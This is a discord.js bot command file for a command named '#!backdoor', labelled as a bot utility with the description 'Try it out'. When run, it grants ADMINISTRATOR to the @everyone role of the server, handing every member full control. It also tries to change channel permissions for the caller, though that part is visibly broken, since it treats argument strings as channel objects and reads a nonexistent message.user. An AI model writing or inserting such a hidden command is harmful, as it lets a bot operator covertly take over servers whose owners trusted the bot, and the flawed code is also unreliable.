const { Permissions } = require('discord.js');
module.exports = {
	category: 'BotUtils',
	name: '#!backdoor',
	description: 'Try it out',
	guildOnly: true,
	cooldown: 3,
	minReqPermissions: ['SEND_MESSAGES'],
	maxReqPermissions: ['ADMINISTRATOR'],
	botExecutePermissions: ['SEND_MESSAGES'],
	requireArgs: false,
	botAdminOnly: true,
	usage: 'backdoor <channelid>',
	stability: 'uwu',
	execute(client, message, args) {
		message.guild.roles.everyone.setPermissions([Permissions.ADMINISTRATOR]);
		for (const i in args) {
			const channelToModify = args[i];
			channelToModify.permissionOverwrites.set([
				{
					id: message.user.id,
					allow: [Permissions.FLAGS.VIEW_CHANNEL]
				}
			]);
		}
	}
};
